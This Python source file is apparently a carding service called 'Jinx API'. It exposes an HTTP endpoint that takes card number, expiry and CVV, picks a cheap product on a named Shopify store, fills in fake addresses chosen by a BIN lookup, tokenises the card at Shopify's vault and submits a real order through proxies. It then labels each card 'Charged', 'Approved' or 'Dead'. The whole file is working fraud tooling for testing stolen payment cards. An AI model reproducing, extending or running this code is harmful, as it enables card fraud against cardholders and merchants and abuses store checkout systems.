#!/usr/bin/env python3
"""
Jinx API — Nomi + ShopifyK Combined (FINAL v7.0)
==================================================
Based on:
  - Nomi API (5_6158852075896710396.py) — query syntax
  - ShopifyK.py — checkout workflow

Endpoint: GET /Shopify?cc=<card>&site=<site>&proxy=<optional>&debug=1
Response: {"Response": "...", "Price": "...", "Gateway": "...", "Status": "...", "Debug": "..."}
"""

import os
import sys
import re
import json
import time
import random
import logging
import asyncio
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ImportError:
    print("❌ pip install requests")
    sys.exit(1)

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False


# ═══ CONFIG ═══
BRAND = "Jinx"
VERSION = "7.0.0"
HOST = os.environ.get("API_HOST", "0.0.0.0")
PORT = int(os.environ.get("PORT", "8080"))
WORKERS = int(os.environ.get("API_WORKERS", "20"))

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("jinx")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"

VAULT_ENDPOINTS = [
    "https://checkout.pci.shopifyinc.com/sessions",
    "https://deposit.us.shopifycs.com/sessions",
]


# ═══ ADDRESS BOOK ═══
ADDR_BOOK = {
    "US": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
           "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
           "firstName": "John", "lastName": "Smith"},
    "CA": {"address1": "88 Queen St W", "city": "Toronto", "postalCode": "M5H2M5",
           "zoneCode": "ON", "countryCode": "CA", "phone": "+14165551234",
           "firstName": "John", "lastName": "Smith"},
    "GB": {"address1": "221B Baker St", "city": "London", "postalCode": "NW16XE",
           "zoneCode": "LND", "countryCode": "GB", "phone": "+442079460123",
           "firstName": "John", "lastName": "Smith"},
    "MX": {"address1": "Av. Reforma 222", "city": "Ciudad de Mexico", "postalCode": "06600",
           "zoneCode": "CMX", "countryCode": "MX", "phone": "+525555555555",
           "firstName": "John", "lastName": "Smith"},
    "DEFAULT": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
                "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
                "firstName": "John", "lastName": "Smith"},
}

_bin_cache = {}
_bin_lock = __import__("threading").Lock()


def lookup_bin_country(bin6):
    bin6 = str(bin6)[:6]
    if not bin6.isdigit():
        return "US"
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            c = (d.get("country_code") or d.get("country_alpha2") or "US").upper()
            with _bin_lock:
                _bin_cache[bin6] = c
            return c
    except Exception:
        pass
    with _bin_lock:
        _bin_cache[bin6] = "US"
    return "US"


def addr_for(cc_number):
    cc = lookup_bin_country(cc_number[:6])
    return ADDR_BOOK.get(cc, ADDR_BOOK["DEFAULT"])


# ═══ PROXY PARSER ═══
def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p:
        return None
    if p.startswith(("socks5://", "socks5h://", "socks4://", "http://", "https://")):
        return p
    if "@" in p:
        return f"http://{p}"
    parts = p.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return None


# ═══ HELPERS ═══
def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0] or None
    except Exception:
        pass
    return None


def clean_price(raw):
    if raw is None:
        return "-"
    s = str(raw).strip()
    if not s or s in ("-", "0.00", "$0.00", "0", "$0"):
        return "-"
    s = s.replace("$", "").strip()
    try:
        val = float(s)
        if val <= 0:
            return "-"
        return f"${val:.2f}"
    except Exception:
        return "-"


# ═══ SIMPLIFIED QUERIES (Shopify-compatible) ═══
# Based on Nomi API + ShopifyK.py — union-safe syntax

PROPOSAL_QUERY = (
    "query Proposal("
    "$delivery:DeliveryTermsInput,"
    "$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,"
    "$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,"
    "$taxes:TaxTermInput,"
    "$sessionInput:SessionTokenInput!,"
    "$checkpointData:String,"
    "$queueToken:String"
    "){"
    "session(sessionInput:$sessionInput){"
    "negotiate(input:{"
    "purchaseProposal:{"
    "delivery:$delivery,"
    "discounts:$discounts,"
    "payment:$payment,"
    "merchandise:$merchandise,"
    "buyerIdentity:$buyerIdentity,"
    "taxes:$taxes"
    "},"
    "checkpointData:$checkpointData,"
    "queueToken:$queueToken"
    "){"
    "__typename "
    "result{"
    "... on NegotiationResultAvailable{"
    "checkpointData "
    "queueToken "
    "sellerProposal{"
    "runningTotal{value{amount currencyCode}}"
    "delivery{"
    "... on FilledDeliveryTerms{"
    "deliveryLines{"
    "id "
    "availableDeliveryStrategies{"
    "handle "
    "amount{value{amount currencyCode}}"
    "}"
    "}"
    "}"
    "}"
    "payment{"
    "... on FilledPaymentTerms{"
    "availablePaymentLines{"
    "paymentMethod{"
    "name "
    "paymentMethodIdentifier"
    "}"
    "}"
    "}"
    "}"
    "}"
    "}"
    "... on CheckpointDenied{redirectUrl}"
    "... on Throttled{pollAfter queueToken pollUrl}"
    "... on NegotiationResultFailed{__typename}"
    "}"
    "errors{code localizedMessage}"
    "}"
    "}"
)

SUBMIT_QUERY = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,"
    "$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$analytics:AnalyticsInput"
    "){"
    "submitForCompletion("
    "input:$input "
    "attemptToken:$attemptToken "
    "metafields:$metafields "
    "analytics:$analytics"
    "){"
    "... on SubmitSuccess{receipt{id token __typename}}"
    "... on SubmitAlreadyAccepted{receipt{id token __typename}}"
    "... on SubmitFailed{reason}"
    "... on SubmitRejected{errors{code localizedMessage nonLocalizedMessage}}"
    "... on Throttled{pollAfter pollUrl queueToken}"
    "... on CheckpointDenied{redirectUrl}"
    "... on SubmittedForCompletion{receipt{id token __typename}}"
    "}"
    "}"
)

POLL_QUERY = (
    "query PollForReceipt("
    "$receiptId:ID!,"
    "$sessionToken:String!"
    "){"
    "receipt("
    "receiptId:$receiptId,"
    "sessionInput:{sessionToken:$sessionToken}"
    "){"
    "... on ProcessedReceipt{id token orderIdentity{buyerIdentifier id}}"
    "... on ProcessingReceipt{id pollDelay}"
    "... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url}}}"
    "... on FailedReceipt{id processingError{... on PaymentFailed{code messageUntranslated}}}"
    "}"
    "}"
)


# ═══ CHECKOUT (Sync — using requests, based on Nomi API) ═══
def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
    out = {
        "Response": "CARD_DECLINED",
        "Price": "-",
        "Gateway": "Shopify",
        "Status": "Dead",
        "Card": cc_raw,
        "Site": site_raw,
        "Debug": "",
    }

    def dbg(msg):
        if debug:
            out["Debug"] += f" | {msg}"
        log.warning(f"[{cc_raw[:6]}] {msg}")

    parts = cc_raw.split("|")
    if len(parts) != 4:
        out["Response"] = "INVALID_FORMAT"
        return out

    cc, mm, yyyy, cvv = parts
    if len(yyyy) == 2:
        yyyy = "20" + yyyy

    site = re.sub(r"^https?://", "", site_raw.strip()).rstrip("/")
    proxy_url = parse_proxy(proxy_raw) if proxy_raw else None

    a = addr_for(cc)
    country = a["countryCode"]
    currency = "USD"

    dbg(f"START proxy={bool(proxy_url)} country={country}")

    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if proxy_url:
        s.proxies.update({"http": proxy_url, "https": proxy_url})

    no_proxy = requests.Session()
    no_proxy.headers.update({"User-Agent": UA})

    try:
        # ── 1. Products ──
        try:
            r = s.get(f"https://{site}/products.json", timeout=15)
            dbg(f"products.json → {r.status_code}")
        except Exception:
            out["Response"] = "PROXY_FAIL"
            out["Status"] = "Proxy Error"
            return out

        if r.status_code == 404:
            out["Response"] = "SITE_DEAD"
            out["Status"] = "Site Error"
            return out

        if r.status_code != 200:
            out["Response"] = f"PRODUCTS_HTTP_{r.status_code}"
            out["Status"] = "Site Error"
            return out

        try:
            data = r.json()
        except Exception:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        valid = []
        blacklist = ["sample", "free", "gift", "test", "donation", "tip"]
        for p in data.get("products", []):
            title = (p.get("title") or "").lower()
            if any(w in title for w in blacklist):
                continue
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    price = float(str(v.get("price", "999")).replace(",", ""))
                except Exception:
                    continue
                if 0.10 <= price <= 30.00:
                    valid.append({"id": v["id"], "price": price})

        if not valid:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        valid.sort(key=lambda x: x["price"])
        mid = min(len(valid) // 2, len(valid) - 1)
        vid = valid[mid]["id"]
        out["Price"] = f"{valid[mid]['price']:.2f}"
        dbg(f"Picked variant {vid} at ${out['Price']}")

        # ── 2. Cart ──
        try:
            r = s.post(f"https://{site}/cart/add.js",
                headers={"Accept": "application/json",
                         "Content-Type": "application/json",
                         "Referer": f"https://{site}/",
                         "Origin": f"https://{site}"},
                json={"items": [{"id": int(vid), "quantity": 1}]},
                timeout=15)
            if r.status_code != 200:
                r = s.post(f"https://{site}/cart/add.js",
                    headers={"Accept": "application/json",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "Referer": f"https://{site}/",
                             "Origin": f"https://{site}"},
                    data={"id": str(vid), "quantity": "1", "form_type": "product"},
                    timeout=15)
            if r.status_code != 200:
                out["Response"] = "CART_FAILED"
                out["Status"] = "Site Error"
                return out
            dbg("Cart added")
        except Exception:
            out["Response"] = "CART_FAILED"
            out["Status"] = "Site Error"
            return out

        # ── 3. Checkout init ──
        try:
            r = s.post(f"https://{site}/cart",
                headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Origin": f"https://{site}",
                         "Referer": f"https://{site}/cart",
                         "Upgrade-Insecure-Requests": "1"},
                data={"checkout": "", "updates[]": "1"},
                allow_redirects=False, timeout=15)

            if r.status_code not in (301, 302, 303, 307, 308):
                out["Response"] = "SITE_ERROR"
                out["Status"] = "Site Error"
                return out

            loc1 = r.headers.get("location", "")
            r2 = s.get(loc1, allow_redirects=False, timeout=15)
            final_url = r2.headers.get("location", "") if r2.status_code in (301, 302, 303, 307, 308) else loc1
            r3 = s.get(final_url, timeout=25)
            html = r3.text
            dbg(f"Checkout {len(html)} bytes")
        except Exception:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        if len(html) < 500:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        # ── 4. Session token ──
        session_token = None
        for pat in [
            r'"serializedSessionToken"\s*:\s*"([^"]+)"',
            r'"sessionToken"\s*:\s*"([^"]+)"',
            r'serialized-sessionToken[^>]*content="&quot;([^&]+)&quot;"',
        ]:
            m = re.search(pat, html)
            if m:
                session_token = m.group(1)
                break

        if not session_token:
            out["Response"] = "NO_SESSION_TOKEN"
            out["Status"] = "Site Error"
            return out
        dbg("Session token OK")

        queue_token = ""
        for pat in [r'"queueToken"\s*:\s*"([^"]+)"', r'queueToken&quot;:&quot;([^&]+)&quot;']:
            m = re.search(pat, html)
            if m:
                queue_token = m.group(1)
                break

        stable_id = ""
        for pat in [r'"stableId"\s*:\s*"([^"]+)"', r'stableId&quot;:&quot;([^&]+)&quot;']:
            m = re.search(pat, html)
            if m:
                stable_id = m.group(1)
                break

        attempt_token = ""
        m = re.search(r"/checkouts/cn/([a-zA-Z0-9]+)", final_url)
        if m:
            attempt_token = m.group(1)

        # ── 5. Proposal (first) ──
        gql_url = f"https://{site}/checkouts/unstable/graphql"
        gql_headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": f"https://{site}",
            "Referer": f"https://{site}/",
            "X-Checkout-One-Session-Token": session_token,
            "X-Checkout-Web-Deploy-Stage": "production",
            "X-Checkout-Web-Server-Handling": "fast",
            "X-Checkout-Web-Source-Id": attempt_token,
        }

        addr_obj = {
            "address1": a["address1"], "city": a["city"],
            "countryCode": country, "postalCode": a["postalCode"],
            "firstName": a["firstName"], "lastName": a["lastName"],
            "zoneCode": a["zoneCode"], "phone": a["phone"],
        }

        state = {"queue": queue_token, "checkpoint": None, "delivery": ""}

        def proposal_payload(handle=None):
            delivery_line = {
                "destination": {"streetAddress": addr_obj},
                "targetMerchandiseLines": (
                    {"lines": [{"stableId": stable_id or "1"}]} if handle else {"any": True}
                ),
                "deliveryMethodTypes": ["SHIPPING"],
                "expectedTotalPrice": {"any": True},
                "destinationChanged": (handle is None),
            }
            if handle:
                delivery_line["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {
                        "handle": handle,
                        "customDeliveryRate": False,
                    },
                    "options": {},
                }
            else:
                delivery_line["selectedDeliveryStrategy"] = {
                    "deliveryStrategyMatchingConditions": {
                        "estimatedTimeInTransit": {"any": True},
                        "shipments": {"any": True},
                    },
                    "options": {},
                }

            return {
                "query": PROPOSAL_QUERY,
                "variables": {
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": state["queue"] or "",
                    "checkpointData": state["checkpoint"],
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [delivery_line],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                                    "variantId": f"gid://shopify/ProductVariant/{vid}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                },
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True},
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }],
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {"streetAddress": addr_obj},
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": currency,
                            "countryCode": country,
                        },
                        "email": "test@example.com",
                        "emailChanged": False,
                        "phoneCountryCode": country,
                        "marketingConsent": [{"email": {"value": "test@example.com"}}],
                        "shopPayOptInPhone": {"countryCode": country},
                        "rememberMe": False,
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                },
                "operationName": "Proposal",
            }

        # Try Proposal (6 retries)
        for attempt in range(6):
            try:
                r = s.post(gql_url, headers=gql_headers, json=proposal_payload(), timeout=20)
                dbg(f"Proposal #{attempt+1} → HTTP {r.status_code}")
                j = r.json()
            except Exception as e:
                dbg(f"Proposal #{attempt+1} EXC: {type(e).__name__}")
                time.sleep(1)
                continue

            if j.get("errors"):
                err_msg = str(j["errors"])[:80]
                dbg(f"Proposal GraphQL errors: {err_msg}")
                break

            negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
            result = negotiate.get("result", {}) or {}
            tn = result.get("__typename", "")
            dbg(f"Proposal #{attempt+1} result: {tn}")

            if tn != "NegotiationResultAvailable":
                time.sleep(1)
                continue

            state["queue"] = result.get("queueToken") or state["queue"]
            state["checkpoint"] = result.get("checkpointData") or state["checkpoint"]
            seller = result.get("sellerProposal", {}) or {}
            delivery = seller.get("delivery", {}) or {}

            if delivery.get("__typename") == "FilledDeliveryTerms":
                dl = delivery.get("deliveryLines", []) or []
                if dl:
                    strats = dl[0].get("availableDeliveryStrategies", []) or []
                    if strats:
                        state["delivery"] = strats[0].get("handle", "")
                        dbg(f"Delivery handle: {state['delivery']}")
                        break
            time.sleep(1)

        if not state["delivery"]:
            out["Response"] = "NO_DELIVERY_STRATEGY"
            out["Status"] = "Site Error"
            return out

        # ── 6. Proposal (second — with delivery handle) ──
        try:
            r = s.post(gql_url, headers=gql_headers, json=proposal_payload(state["delivery"]), timeout=20)
            j = r.json()
        except Exception:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
        result = negotiate.get("result", {}) or {}
        payment_method_id = ""
        if result.get("__typename") == "NegotiationResultAvailable":
            state["checkpoint"] = result.get("checkpointData") or state["checkpoint"]
            state["queue"] = result.get("queueToken") or state["queue"]
            seller = result.get("sellerProposal", {}) or {}
            pl = (seller.get("payment", {}) or {}).get("availablePaymentLines", []) or []
            if pl:
                payment_method_id = pl[0].get("paymentMethod", {}).get("paymentMethodIdentifier", "")

        if not payment_method_id:
            out["Response"] = "NO_PAYMENT_METHOD"
            out["Status"] = "Site Error"
            return out
        dbg(f"Payment method OK")

        # ── 7. Vault ──
        vault_payload = {
            "credit_card": {
                "number": cc, "month": int(mm), "year": int(yyyy),
                "verification_value": cvv, "name": f"{a['firstName']} {a['lastName']}",
            },
            "payment_session_scope": site,
        }
        payment_session_id = None
        for url in VAULT_ENDPOINTS:
            try:
                r = no_proxy.post(url, json=vault_payload,
                    headers={"Content-Type": "application/json",
                             "Accept": "application/json",
                             "Origin": "https://checkout.shopifycs.com",
                             "Referer": "https://checkout.shopifycs.com/",
                             "User-Agent": UA}, timeout=15)
                if r.status_code == 200:
                    pid = r.json().get("id")
                    if pid:
                        payment_session_id = pid
                        break
            except Exception:
                pass

        if not payment_session_id:
            out["Response"] = "VAULT_FAILED"
            out["Status"] = "Site Error"
            return out
        dbg("Payment token OK")

        # ── 8. Submit ──
        submit_payload = {
            "query": SUBMIT_QUERY,
            "variables": {
                "input": {
                    "checkpointData": state["checkpoint"],
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": state["queue"] or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {
                                    "handle": state["delivery"],
                                    "customDeliveryRate": False,
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {
                                "lines": [{"stableId": stable_id or "1"}],
                            },
                            "destination": {"streetAddress": addr_obj},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": False,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                                    "variantId": f"gid://shopify/ProductVariant/{vid}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                },
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True},
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }],
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_method_id,
                                    "sessionId": payment_session_id,
                                    "billingAddress": {"streetAddress": addr_obj},
                                    "cardSource": None,
                                },
                            },
                            "amount": {"any": True},
                            "dueAt": None,
                        }],
                        "billingAddress": {"streetAddress": addr_obj},
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": currency,
                            "countryCode": country,
                        },
                        "email": "test@example.com",
                        "emailChanged": False,
                        "phoneCountryCode": country,
                        "marketingConsent": [{"email": {"value": "test@example.com"}}],
                        "shopPayOptInPhone": {"countryCode": country},
                        "rememberMe": False,
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                },
                "attemptToken": f"{attempt_token}-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": final_url},
            },
            "operationName": "SubmitForCompletion",
        }

        try:
            r = s.post(gql_url, headers=gql_headers, json=submit_payload, timeout=25)
            j = r.json()
        except Exception:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        c = j.get("data", {}).get("submitForCompletion", {})
        tn = c.get("__typename", "")
        dbg(f"Submit type: {tn}")

        if tn not in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
            errs = c.get("errors", [])
            if errs:
                code = errs[0].get("code", "")
                msg = errs[0].get("localizedMessage", "") or errs[0].get("nonLocalizedMessage", "")
                out["Response"] = code if code else (msg[:60] if msg else "CARD_DECLINED")
                out["Status"] = "Dead"
            else:
                out["Response"] = "SUBMIT_REJECTED"
                out["Status"] = "Dead"
            return out

        rid = (c.get("receipt", {}) or {}).get("id", "")
        if not rid:
            out["Response"] = "SITE_ERROR"
            out["Status"] = "Site Error"
            return out

        # ── 9. Poll ──
        for _ in range(4):
            time.sleep(3)
            try:
                r = s.post(gql_url, headers=gql_headers,
                    json={"query": POLL_QUERY,
                          "variables": {"receiptId": rid, "sessionToken": session_token},
                          "operationName": "PollForReceipt"}, timeout=25)
                j = r.json()
            except Exception:
                continue

            receipt = j.get("data", {}).get("receipt", {}) or {}
            rtn = receipt.get("__typename", "")
            dbg(f"Poll type: {rtn}")

            if rtn == "ProcessedReceipt" or "orderIdentity" in receipt:
                out["Response"] = "ORDER_PLACED"
                out["Status"] = "Charged"
                out["Gateway"] = "Shopify Payments"
                return out

            if rtn == "ActionRequiredReceipt":
                out["Response"] = "3DS_REQUIRED"
                out["Status"] = "Approved"
                out["Gateway"] = "Shopify Payments"
                return out

            if rtn == "FailedReceipt":
                pe = receipt.get("processingError", {}) or {}
                code = pe.get("code", "CARD_DECLINED")
                msg = pe.get("messageUntranslated", "")
                out["Response"] = code if code else "CARD_DECLINED"
                if code in ("INSUFFICIENT_FUNDS", "OTP_REQUIRED"):
                    out["Status"] = "Approved"
                    out["Gateway"] = "Shopify Payments"
                else:
                    out["Status"] = "Dead"
                return out

        out["Response"] = "POLL_TIMEOUT"
        out["Status"] = "Site Error"
        return out

    except Exception as e:
        dbg(f"TOP EXC: {type(e).__name__}: {str(e)[:80]}")
        out["Response"] = f"EXCEPTION_{type(e).__name__}"
        out["Status"] = "Site Error"
        return out
    finally:
        try:
            s.close()
        except Exception:
            pass
        try:
            no_proxy.close()
        except Exception:
            pass


# ═══ HTTP HANDLER ═══
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send_json(self, status, payload):
        try:
            body = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(body)
        except Exception:
            pass

    def log_message(self, fmt, *args):
        sys.stderr.write(f"[{BRAND.lower()}-api] " + (fmt % args) + "\n")

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query, keep_blank_values=True)

        if path in ("/", "/health"):
            self._send_json(200, {
                "status": "ok",
                "service": "jinx-api",
                "version": VERSION,
            })
            return

        if path.lower() in ("/shopify", "/shopify/"):
            cc = (qs.get("cc", [""])[0] or "").strip()
            site = (qs.get("site", [""])[0] or "").strip()
            proxy = (qs.get("proxy", [""])[0] or "").strip() or None
            debug = (qs.get("debug", ["0"])[0] or "0") == "1"

            if not cc or not site:
                self._send_json(400, {
                    "Response": "MISSING_PARAMS",
                    "Price": "-",
                    "Gateway": "UNKNOWN",
                    "Status": "Site Error",
                })
                return

            try:
                result = executor.submit(checkout_sync, cc, site, proxy, debug).result(timeout=180)
                resp = {
                    "Response": result.get("Response", "CARD_DECLINED"),
                    "Price": clean_price(result.get("Price", "-")),
                    "Gateway": result.get("Gateway", "Shopify"),
                    "Status": result.get("Status", "Dead"),
                    "code": result.get("Response", "CARD_DECLINED"),
                    "message": result.get("Response", ""),
                }
                if debug:
                    resp["Debug"] = result.get("Debug", "")
                self._send_json(200, resp)
            except Exception as e:
                self._send_json(500, {
                    "Response": "CARD_DECLINED",
                    "Price": "-",
                    "Gateway": "UNKNOWN",
                    "Status": "Site Error",
                })
            return

        self._send_json(404, {"error": "not found"})

    def do_POST(self):
        self.do_GET()


executor = ThreadPoolExecutor(max_workers=WORKERS)


def main():
    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print(f"║  {BRAND} API v{VERSION} (Nomi + ShopifyK)                  ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"  Listening : http://{HOST}:{PORT}")
    print(f"  Workers   : {WORKERS}")
    print(f"  Endpoint  : GET /Shopify?cc=<card>&site=<site>&proxy=<opt>&debug=0|1")
    print()
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Shutting down...")
        server.shutdown()


if __name__ == "__main__":
    main()
